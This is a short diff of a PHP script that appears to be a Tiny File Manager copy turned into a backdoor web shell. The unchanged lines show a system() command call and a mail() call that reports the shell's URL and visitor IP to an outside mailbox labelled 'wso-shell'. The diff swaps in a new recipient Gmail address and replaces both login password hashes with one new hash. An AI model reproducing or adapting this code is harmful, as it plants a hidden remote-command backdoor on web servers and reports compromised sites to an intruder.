@@ -9,7 +9,7 @@ system($el);
 
 }
 header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'tesemelgan@gmail.com';
+$tujuanmail = 'rootcyberpunks@gmail.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($tujuanmail, "wso-shell", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
@@ -47,8 +47,8 @@ $use_auth = true;
 // Users: array('Username' => 'Password', 'Username2' => 'Password2', ...)
 // Generate secure password hash - https://tinyfilemanager.github.io/docs/pwd.html
 $auth_users = array(
-    'admin' => '$2y$10$/K.hjNr84lLNDt8fTXjoI.DBp6PpeyoJ.mGwrrLuCZfAwfSAGqhOW', //admin@123
-    'user' => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO' //12345
+    'admin' => '$2y$10$YeeTm.tqDOxeDS43bqhAwebwkVf8KQk611xDswTet36ijMH6litza', //admin@123
+    'user' => '$2y$10$YeeTm.tqDOxeDS43bqhAwebwkVf8KQk611xDswTet36ijMH6litza' //12345
 );
 
 // Readonly users
